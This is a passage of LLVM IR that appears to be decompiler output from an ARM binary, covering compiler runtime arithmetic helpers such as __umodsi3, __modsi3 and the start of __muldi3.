  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_123b8, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12360thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1241c = udiv i32 %arg1, %arg2
  ret i32 %v2_1241c
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_12430 = add i32 %arg2, -1
  %v2_12430 = icmp eq i32 %arg2, 0
  br i1 %v2_12430, label %dec_label_pc_124ec, label %dec_label_pc_12438

dec_label_pc_12438:                               ; preds = %entry
  %v7_12430 = icmp eq i32 %arg2, 1
  br i1 %v7_12430, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_12438
  %v1_12438 = load i32, i32* @r0, align 4
  %v10_12438 = icmp eq i32 %v1_12438, %arg2
  br i1 %v10_12438, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_12438, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_12438 = icmp ult i32 %v1_12438, %arg2
  br i1 %v4_12438, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_12440 = and i32 %v1_12430, %arg2
  %v8_12440 = icmp eq i32 %v6_12440, 0
  br i1 %v8_12440, label %.thread67, label %dec_label_pc_12450.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_12444 = phi i32 [ %v1_12438, %bb75 ], [ 0, %.thread65 ]
  %v3_12444 = and i32 %v1_12444, %v1_12430
  br label %bb76

dec_label_pc_12450.preheader:                     ; preds = %bb75
  %v2_1245099 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1245099, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_124e0, %bb74, %bb89, %bb84, %dec_label_pc_124b0, %.thread67
  %v5_12448 = phi i32 [ %v1_12438, %bb74 ], [ %v3_12444, %.thread67 ], [ %v1_1248c.v6_1248c.v6_12494.v6_1249c, %dec_label_pc_124b0 ], [ 0, %bb84 ], [ %v1_124e4, %dec_label_pc_124e0 ], [ %v2_124e0, %bb89 ]
  ret i32 %v5_12448

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_12450.preheader
  %v0_12464.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_12450.preheader ], [ %v4_12458, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_12450.preheader ], [ %v2_1245c11, %.thread1.thread9 ]
  br label %dec_label_pc_12464thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_12450.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_1245c11, %.thread1.thread9 ], [ 0, %dec_label_pc_12450.preheader ]
  %v0_12464.pr33100 = phi i32 [ %v4_12458, %.thread1.thread9 ], [ %arg2, %dec_label_pc_12450.preheader ]
  %v4_12454 = icmp ult i32 %v0_12464.pr33100, %v1_12438
  br i1 %v4_12454, label %bb78, label %dec_label_pc_12464thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_12458 = and i32 %v0_12464.pr33100, 268435456
  %v3_12458 = icmp eq i32 %v2_12458, 0
  %v4_12458 = mul i32 %v0_12464.pr33100, 16
  br i1 %v3_12458, label %.thread1.thread9, label %dec_label_pc_12464.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1245c11 = add i32 %storemerge101, 4
  %v2_12450 = icmp ugt i32 %v4_12458, 268435455
  br i1 %v2_12450, label %.thread, label %bb77

dec_label_pc_12464thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_12464thread-pre-split.loopexit

dec_label_pc_12464thread-pre-split.loopexit:      ; preds = %dec_label_pc_12464thread-pre-split.loopexit.loopexit, %.thread
  %v0_12464.pr3398 = phi i32 [ %v0_12464.pr33.lcssa, %.thread ], [ %v0_12464.pr33100, %dec_label_pc_12464thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_12464thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12464thread-pre-split

dec_label_pc_12464thread-pre-split:               ; preds = %.thread4, %dec_label_pc_12464thread-pre-split.loopexit
  %v1_1247039 = phi i32 [ %storemerge95, %dec_label_pc_12464thread-pre-split.loopexit ], [ %v2_12470, %.thread4 ]
  %v0_12464.pr = phi i32 [ %v0_12464.pr3398, %dec_label_pc_12464thread-pre-split.loopexit ], [ %v3_1246c, %.thread4 ]
  br label %dec_label_pc_12464

dec_label_pc_12464.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_12464

dec_label_pc_12464:                               ; preds = %dec_label_pc_12464.loopexit, %dec_label_pc_12464thread-pre-split
  %v0_12478.pr = phi i32 [ %v1_1247039, %dec_label_pc_12464thread-pre-split ], [ %storemerge101, %dec_label_pc_12464.loopexit ]
  %v1_1246c = phi i32 [ %v0_12464.pr, %dec_label_pc_12464thread-pre-split ], [ %v4_12458, %dec_label_pc_12464.loopexit ]
  %v2_12464 = icmp slt i32 %v1_1246c, 0
  br i1 %v2_12464, label %dec_label_pc_12478, label %bb79

bb79:                                             ; preds = %dec_label_pc_12464
  %v4_12468 = icmp ult i32 %v1_1246c, %v1_12438
  br i1 %v4_12468, label %.thread4, label %dec_label_pc_12478

.thread4:                                         ; preds = %bb79
  %v3_1246c = mul i32 %v1_1246c, 2
  %v2_12470 = add i32 %v0_12478.pr, 1
  br label %dec_label_pc_12464thread-pre-split

dec_label_pc_12478:                               ; preds = %bb79, %dec_label_pc_12464
  %v2_12478 = add i32 %v0_12478.pr, -3
  %v5_1247c = icmp slt i32 %v0_12478.pr, 3
  br i1 %v5_1247c, label %dec_label_pc_124bc, label %dec_label_pc_12480

dec_label_pc_12480:                               ; preds = %dec_label_pc_12478, %bb83
  %v6_124a8 = phi i32 [ %v0_124b0, %bb83 ], [ %v2_12478, %dec_label_pc_12478 ]
  %v1_12484 = phi i32 [ %v1_1248c.v6_1248c.v6_12494.v6_1249c, %bb83 ], [ %v1_12438, %dec_label_pc_12478 ]
  %v3_124a412 = phi i32 [ %v3_124a4, %bb83 ], [ %v1_1246c, %dec_label_pc_12478 ]
  %v3_12480 = icmp ult i32 %v1_12484, %v3_124a412
  %v3_12484 = select i1 %v3_12480, i32 0, i32 %v3_124a412
  %v1_1248c = sub i32 %v1_12484, %v3_12484
  %v4_12488 = udiv i32 %v3_124a412, 2
  %v6_12488 = icmp ult i32 %v1_1248c, %v4_12488
  %v6_1248c = select i1 %v6_12488, i32 0, i32 %v4_12488
  %v1_1248c.v6_1248c = sub i32 %v1_1248c, %v6_1248c
  %.demorgan = and i1 %v3_12480, %v6_12488
  %v4_12490 = udiv i32 %v3_124a412, 4
  %v6_12490 = icmp ult i32 %v1_1248c.v6_1248c, %v4_12490
  %v6_12494 = select i1 %v6_12490, i32 0, i32 %v4_12490
  %v1_1248c.v6_1248c.v6_12494 = sub i32 %v1_1248c.v6_1248c, %v6_12494
  %.demorgan71 = and i1 %.demorgan, %v6_12490
  %v4_12498 = udiv i32 %v3_124a412, 8
  %v6_12498 = icmp ult i32 %v1_1248c.v6_1248c.v6_12494, %v4_12498
  %v6_1249c = select i1 %v6_12498, i32 0, i32 %v4_12498
  %v1_1248c.v6_1248c.v6_12494.v6_1249c = sub i32 %v1_1248c.v6_1248c.v6_12494, %v6_1249c
  %.demorgan72 = and i1 %.demorgan71, %v6_12498
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_12480
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_12480, %bb80
  %v2_124a0 = add i32 %v1_1248c.v6_1248c.v6_12494.v6_1249c, -1
  %v4_124a0 = sub i32 0, %v1_1248c.v6_1248c.v6_12494.v6_1249c
  %v5_124a0 = and i32 %v1_1248c.v6_1248c.v6_12494.v6_1249c, %v4_124a0
  %v3_124a4 = udiv i32 %v3_124a412, 16
  %v5_124a8 = icmp slt i32 %v1_1248c.v6_1248c.v6_12494.v6_1249c, 1
  br i1 %v5_124a8, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_124a8 = add i32 %v6_124a8, -4
  %v9_124a8 = sub i32 3, %v6_124a8
  %v10_124a8 = and i32 %v9_124a8, %v6_124a8
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_124b0 = phi i32 [ %v6_124a8, %bb81 ], [ %v7_124a8, %bb82 ]
  %v0_124ac15.in = phi i32 [ %v2_124a0, %bb81 ], [ %v7_124a8, %bb82 ]
  %v1_124ac14.in = phi i32 [ %v5_124a0, %bb81 ], [ %v10_124a8, %bb82 ]
  %v1_124ac14 = icmp slt i32 %v1_124ac14.in, 0
  %v0_124ac15 = icmp slt i32 %v0_124ac15.in, 0
  %v2_124ac = xor i1 %v0_124ac15, %v1_124ac14
  br i1 %v2_124ac, label %dec_label_pc_124b0, label %dec_label_pc_12480

dec_label_pc_124b0:                               ; preds = %bb83
  %v1_124b0 = urem i32 %v0_124b0, 4
  %v2_124b0 = icmp eq i32 %v1_124b0, 0
  br i1 %v2_124b0, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_124b0
  %v3_124b4 = icmp eq i32 %v1_1248c.v6_1248c.v6_12494.v6_1249c, 0
  br i1 %v3_124b4, label %bb76, label %dec_label_pc_124bc

dec_label_pc_124bc:                               ; preds = %bb84, %dec_label_pc_12478
  %v0_124d0 = phi i32 [ %v3_124a4, %bb84 ], [ %v1_1246c, %dec_label_pc_12478 ]
  %v1_124cc = phi i32 [ %v1_1248c.v6_1248c.v6_12494.v6_1249c, %bb84 ], [ %v1_12438, %dec_label_pc_12478 ]
  %v0_124bc = phi i32 [ %v0_124b0, %bb84 ], [ %v2_12478, %dec_label_pc_12478 ]
  %v5_124c0 = icmp slt i32 %v0_124bc, -2
  br i1 %v5_124c0, label %dec_label_pc_124e0, label %dec_label_pc_124c4

dec_label_pc_124c4:                               ; preds = %dec_label_pc_124bc
  %v8_124bc = icmp eq i32 %v0_124bc, -2
  br i1 %v8_124bc, label %dec_label_pc_124d4, label %dec_label_pc_124c8

dec_label_pc_124c8:                               ; preds = %dec_label_pc_124c4
  %v3_124c8 = icmp ult i32 %v1_124cc, %v0_124d0
  br i1 %v3_124c8, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_124c8
  %v2_124c8 = sub i32 %v1_124cc, %v0_124d0
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_124c8, %bb85
  %v0_124d452 = phi i32 [ %v1_124cc, %dec_label_pc_124c8 ], [ %v2_124c8, %bb85 ]
  %v3_124d0 = udiv i32 %v0_124d0, 2
  br label %dec_label_pc_124d4

dec_label_pc_124d4:                               ; preds = %dec_label_pc_124c4, %bb86
  %v0_124dc = phi i32 [ %v0_124d0, %dec_label_pc_124c4 ], [ %v3_124d0, %bb86 ]
  %v1_124d8 = phi i32 [ %v1_124cc, %dec_label_pc_124c4 ], [ %v0_124d452, %bb86 ]
  %v3_124d4 = icmp ult i32 %v1_124d8, %v0_124dc
  br i1 %v3_124d4, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_124d4
  %v2_124d4 = sub i32 %v1_124d8, %v0_124dc
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_124d4, %bb87
  %v0_124e055 = phi i32 [ %v1_124d8, %dec_label_pc_124d4 ], [ %v2_124d4, %bb87 ]
  %v3_124dc = udiv i32 %v0_124dc, 2
  br label %dec_label_pc_124e0

dec_label_pc_124e0:                               ; preds = %dec_label_pc_124bc, %bb88
  %v2_124e4 = phi i32 [ %v0_124d0, %dec_label_pc_124bc ], [ %v3_124dc, %bb88 ]
  %v1_124e4 = phi i32 [ %v1_124cc, %dec_label_pc_124bc ], [ %v0_124e055, %bb88 ]
  %v3_124e0 = icmp ult i32 %v1_124e4, %v2_124e4
  br i1 %v3_124e0, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_124e0
  %v2_124e0 = sub i32 %v1_124e4, %v2_124e4
  br label %bb76

dec_label_pc_124ec:                               ; preds = %entry
  %v0_124ec = load i32, i32* @lr, align 4
  %v0_124f0 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_124ec)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_124e4, { 1, 2, 0 }
  uselistorder i32 %v0_124d0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_124b0, { 1, 0, 2 }
  uselistorder i32 %v7_124a8, { 1, 0 }
  uselistorder i32 %v3_124a4, { 1, 0 }
  uselistorder i32 %v1_1248c.v6_1248c.v6_12494.v6_1249c, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_12498, { 1, 0 }
  uselistorder i32 %v4_12490, { 1, 0 }
  uselistorder i32 %v4_12488, { 1, 0 }
  uselistorder i32 %v6_124a8, { 3, 0, 2, 1 }
  uselistorder i32 %v2_12478, { 1, 0 }
  uselistorder i32 %v1_1246c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_12458, { 1, 0, 3, 2 }
  uselistorder i32 %v0_12464.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12438, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_124e0, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_124d4, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_12480, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_124fc = icmp eq i32 %arg2, 0
  br i1 %v2_124fc, label %dec_label_pc_125d0, label %dec_label_pc_12504

dec_label_pc_12504:                               ; preds = %entry
  %v1_124fc = icmp slt i32 %arg2, 0
  br i1 %v1_124fc, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_12504
  %v2_12504 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_12504, %bb
  %v4_1251c = phi i32 [ %arg2, %dec_label_pc_12504 ], [ %v2_12504, %bb ]
  %v0_12508 = load i32, i32* @r0, align 4
  %v1_12508 = icmp slt i32 %v0_12508, 0
  br i1 %v1_12508, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_1250c = sub i32 0, %v0_12508
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_12514 = phi i32 [ %v0_12508, %bb79 ], [ %v2_1250c, %bb80 ]
  %v1_12510 = add i32 %v4_1251c, -1
  %v7_12510 = icmp eq i32 %v4_1251c, 1
  br i1 %v7_12510, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_12514 = icmp eq i32 %v1_12514, %v4_1251c
  br i1 %v10_12514, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_12514 = icmp ult i32 %v1_12514, %v4_1251c
  br i1 %v4_12514, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_1251c = and i32 %v1_12510, %v4_1251c
  %v8_1251c = icmp eq i32 %v6_1251c, 0
  br i1 %v8_1251c, label %.thread72, label %dec_label_pc_1252c.preheader

dec_label_pc_1252c.preheader:                     ; preds = %bb84
  %v2_1252c109 = icmp ugt i32 %v4_1251c, 268435455
  br i1 %v2_1252c109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_1252064 = phi i32 [ %v1_12514, %bb84 ], [ 0, %.thread70 ]
  %v3_12520 = and i32 %v1_1252064, %v1_12510
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_1252c.preheader
  %v0_12540.pr35.lcssa = phi i32 [ %v4_1251c, %dec_label_pc_1252c.preheader ], [ %v4_12534, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_1252c.preheader ], [ %v2_125389, %.thread2.thread7 ]
  br label %dec_label_pc_12540thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_1252c.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_125389, %.thread2.thread7 ], [ 0, %dec_label_pc_1252c.preheader ]
  %v0_12540.pr35110 = phi i32 [ %v4_12534, %.thread2.thread7 ], [ %v4_1251c, %dec_label_pc_1252c.preheader ]
  %v4_12530 = icmp ult i32 %v0_12540.pr35110, %v1_12514
  br i1 %v4_12530, label %bb86, label %dec_label_pc_12540thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_12534 = and i32 %v0_12540.pr35110, 268435456
  %v3_12534 = icmp eq i32 %v2_12534, 0
  %v4_12534 = mul i32 %v0_12540.pr35110, 16
  br i1 %v3_12534, label %.thread2.thread7, label %dec_label_pc_12540.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_125389 = add i32 %storemerge111, 4
  %v2_1252c = icmp ugt i32 %v4_12534, 268435455
  br i1 %v2_1252c, label %.thread1, label %bb85

dec_label_pc_12540thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_12540thread-pre-split.loopexit

dec_label_pc_12540thread-pre-split.loopexit:      ; preds = %dec_label_pc_12540thread-pre-split.loopexit.loopexit, %.thread1
  %v0_12540.pr35108 = phi i32 [ %v0_12540.pr35.lcssa, %.thread1 ], [ %v0_12540.pr35110, %dec_label_pc_12540thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_12540thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12540thread-pre-split

dec_label_pc_12540thread-pre-split:               ; preds = %.thread4, %dec_label_pc_12540thread-pre-split.loopexit
  %v1_1254c41 = phi i32 [ %storemerge105, %dec_label_pc_12540thread-pre-split.loopexit ], [ %v2_1254c, %.thread4 ]
  %v2_1254436 = phi i32 [ %v1_12514, %dec_label_pc_12540thread-pre-split.loopexit ], [ %v2_12544, %.thread4 ]
  %v0_12540.pr = phi i32 [ %v0_12540.pr35108, %dec_label_pc_12540thread-pre-split.loopexit ], [ %v3_12548, %.thread4 ]
  br label %dec_label_pc_12540

dec_label_pc_12540.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_12540

dec_label_pc_12540:                               ; preds = %dec_label_pc_12540.loopexit, %dec_label_pc_12540thread-pre-split
  %v0_12554.pr = phi i32 [ %v1_1254c41, %dec_label_pc_12540thread-pre-split ], [ %storemerge111, %dec_label_pc_12540.loopexit ]
  %v2_12544 = phi i32 [ %v2_1254436, %dec_label_pc_12540thread-pre-split ], [ %v1_12514, %dec_label_pc_12540.loopexit ]
  %v1_12548 = phi i32 [ %v0_12540.pr, %dec_label_pc_12540thread-pre-split ], [ %v4_12534, %dec_label_pc_12540.loopexit ]
  %v2_12540 = icmp slt i32 %v1_12548, 0
  br i1 %v2_12540, label %dec_label_pc_12554, label %bb87

bb87:                                             ; preds = %dec_label_pc_12540
  %v4_12544 = icmp ult i32 %v1_12548, %v2_12544
  br i1 %v4_12544, label %.thread4, label %dec_label_pc_12554

.thread4:                                         ; preds = %bb87
  %v3_12548 = mul i32 %v1_12548, 2
  %v2_1254c = add i32 %v0_12554.pr, 1
  br label %dec_label_pc_12540thread-pre-split

dec_label_pc_12554:                               ; preds = %bb87, %dec_label_pc_12540
  %v2_12554 = add i32 %v0_12554.pr, -3
  %v5_12558 = icmp slt i32 %v0_12554.pr, 3
  br i1 %v5_12558, label %dec_label_pc_12598, label %dec_label_pc_1255c

dec_label_pc_1255c:                               ; preds = %dec_label_pc_12554, %bb91
  %v6_12584 = phi i32 [ %v0_1258c, %bb91 ], [ %v2_12554, %dec_label_pc_12554 ]
  %v1_12560 = phi i32 [ %v1_12568.v6_12568.v6_12570.v6_12578, %bb91 ], [ %v2_12544, %dec_label_pc_12554 ]
  %v3_1258010 = phi i32 [ %v3_12580, %bb91 ], [ %v1_12548, %dec_label_pc_12554 ]
  %v3_1255c = icmp ult i32 %v1_12560, %v3_1258010
  %v3_12560 = select i1 %v3_1255c, i32 0, i32 %v3_1258010
  %v1_12568 = sub i32 %v1_12560, %v3_12560
  %v4_12564 = udiv i32 %v3_1258010, 2
  %v6_12564 = icmp ult i32 %v1_12568, %v4_12564
  %v6_12568 = select i1 %v6_12564, i32 0, i32 %v4_12564
  %v1_12568.v6_12568 = sub i32 %v1_12568, %v6_12568
  %.demorgan = and i1 %v3_1255c, %v6_12564
  %v4_1256c = udiv i32 %v3_1258010, 4
  %v6_1256c = icmp ult i32 %v1_12568.v6_12568, %v4_1256c
  %v6_12570 = select i1 %v6_1256c, i32 0, i32 %v4_1256c
  %v1_12568.v6_12568.v6_12570 = sub i32 %v1_12568.v6_12568, %v6_12570
  %.demorgan76 = and i1 %.demorgan, %v6_1256c
  %v4_12574 = udiv i32 %v3_1258010, 8
  %v6_12574 = icmp ult i32 %v1_12568.v6_12568.v6_12570, %v4_12574
  %v6_12578 = select i1 %v6_12574, i32 0, i32 %v4_12574
  %v1_12568.v6_12568.v6_12570.v6_12578 = sub i32 %v1_12568.v6_12568.v6_12570, %v6_12578
  %.demorgan77 = and i1 %.demorgan76, %v6_12574
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_1255c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_1255c, %bb88
  %v2_1257c = add i32 %v1_12568.v6_12568.v6_12570.v6_12578, -1
  %v4_1257c = sub i32 0, %v1_12568.v6_12568.v6_12570.v6_12578
  %v5_1257c = and i32 %v1_12568.v6_12568.v6_12570.v6_12578, %v4_1257c
  %v3_12580 = udiv i32 %v3_1258010, 16
  %v5_12584 = icmp slt i32 %v1_12568.v6_12568.v6_12570.v6_12578, 1
  br i1 %v5_12584, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_12584 = add i32 %v6_12584, -4
  %v9_12584 = sub i32 3, %v6_12584
  %v10_12584 = and i32 %v9_12584, %v6_12584
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_1258c = phi i32 [ %v6_12584, %bb89 ], [ %v7_12584, %bb90 ]
  %v0_1258813.in = phi i32 [ %v2_1257c, %bb89 ], [ %v7_12584, %bb90 ]
  %v1_1258812.in = phi i32 [ %v5_1257c, %bb89 ], [ %v10_12584, %bb90 ]
  %v1_1258812 = icmp slt i32 %v1_1258812.in, 0
  %v0_1258813 = icmp slt i32 %v0_1258813.in, 0
  %v2_12588 = xor i1 %v0_1258813, %v1_1258812
  br i1 %v2_12588, label %dec_label_pc_1258c, label %dec_label_pc_1255c

dec_label_pc_1258c:                               ; preds = %bb91
  %v1_1258c = urem i32 %v0_1258c, 4
  %v2_1258c = icmp eq i32 %v1_1258c, 0
  br i1 %v2_1258c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_1258c
  %v3_12590 = icmp eq i32 %v1_12568.v6_12568.v6_12570.v6_12578, 0
  br i1 %v3_12590, label %.thread6, label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %bb92, %dec_label_pc_12554
  %v0_125ac = phi i32 [ %v3_12580, %bb92 ], [ %v1_12548, %dec_label_pc_12554 ]
  %v1_125a8 = phi i32 [ %v1_12568.v6_12568.v6_12570.v6_12578, %bb92 ], [ %v2_12544, %dec_label_pc_12554 ]
  %v0_12598 = phi i32 [ %v0_1258c, %bb92 ], [ %v2_12554, %dec_label_pc_12554 ]
  %v5_1259c = icmp slt i32 %v0_12598, -2
  br i1 %v5_1259c, label %dec_label_pc_125bc, label %dec_label_pc_125a0

dec_label_pc_125a0:                               ; preds = %dec_label_pc_12598
  %v8_12598 = icmp eq i32 %v0_12598, -2
  br i1 %v8_12598, label %dec_label_pc_125b0, label %dec_label_pc_125a4

dec_label_pc_125a4:                               ; preds = %dec_label_pc_125a0
  %v3_125a4 = icmp ult i32 %v1_125a8, %v0_125ac
  br i1 %v3_125a4, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_125a4
  %v2_125a4 = sub i32 %v1_125a8, %v0_125ac
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_125a4, %bb93
  %v0_125b054 = phi i32 [ %v1_125a8, %dec_label_pc_125a4 ], [ %v2_125a4, %bb93 ]
  %v3_125ac = udiv i32 %v0_125ac, 2
  br label %dec_label_pc_125b0

dec_label_pc_125b0:                               ; preds = %dec_label_pc_125a0, %bb94
  %v0_125b8 = phi i32 [ %v0_125ac, %dec_label_pc_125a0 ], [ %v3_125ac, %bb94 ]
  %v1_125b4 = phi i32 [ %v1_125a8, %dec_label_pc_125a0 ], [ %v0_125b054, %bb94 ]
  %v3_125b0 = icmp ult i32 %v1_125b4, %v0_125b8
  br i1 %v3_125b0, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_125b0
  %v2_125b0 = sub i32 %v1_125b4, %v0_125b8
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_125b0, %bb95
  %v0_125bc57 = phi i32 [ %v1_125b4, %dec_label_pc_125b0 ], [ %v2_125b0, %bb95 ]
  %v3_125b8 = udiv i32 %v0_125b8, 2
  br label %dec_label_pc_125bc

dec_label_pc_125bc:                               ; preds = %dec_label_pc_12598, %bb96
  %v2_125c0 = phi i32 [ %v0_125ac, %dec_label_pc_12598 ], [ %v3_125b8, %bb96 ]
  %v1_125c0 = phi i32 [ %v1_125a8, %dec_label_pc_12598 ], [ %v0_125bc57, %bb96 ]
  %v3_125bc = icmp ult i32 %v1_125c0, %v2_125c0
  br i1 %v3_125bc, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_125bc
  %v2_125bc = sub i32 %v1_125c0, %v2_125c0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_125bc, %bb83, %.thread72, %dec_label_pc_1258c, %bb92, %bb97
  %v1_125c8 = phi i32 [ %v1_12568.v6_12568.v6_12570.v6_12578, %dec_label_pc_1258c ], [ 0, %bb92 ], [ %v1_125c0, %dec_label_pc_125bc ], [ %v2_125bc, %bb97 ], [ %v3_12520, %.thread72 ], [ %v1_12514, %bb83 ]
  br i1 %v1_12508, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_125c8 = sub i32 0, %v1_125c8
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_125cc = phi i32 [ %v1_125c8, %.thread6 ], [ %v2_125c8, %bb98 ]
  ret i32 %v1_125cc

dec_label_pc_125d0:                               ; preds = %entry
  %v0_125d0 = load i32, i32* @lr, align 4
  %v0_125d4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_125d0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_125ac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1258c, { 1, 0, 2 }
  uselistorder i32 %v7_12584, { 1, 0 }
  uselistorder i32 %v3_12580, { 1, 0 }
  uselistorder i32 %v1_12568.v6_12568.v6_12570.v6_12578, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_12574, { 1, 0 }
  uselistorder i32 %v4_1256c, { 1, 0 }
  uselistorder i32 %v4_12564, { 1, 0 }
  uselistorder i32 %v6_12584, { 3, 0, 2, 1 }
  uselistorder i32 %v2_12554, { 1, 0 }
  uselistorder i32 %v1_12548, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_12544, { 1, 0, 3, 2 }
  uselistorder i32 %v4_12534, { 1, 0, 3, 2 }
  uselistorder i32 %v0_12540.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12514, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_1251c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_125bc, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_125b0, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_1255c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_125e0 = load i32, i32* @r0, align 4
  ret i32 %v1_125e0
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_125f0 = udiv i32 %arg1, 65536
  %v3_125f4 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_125f0, -65536
  %v5_125f8 = add i32 %tmp, -1
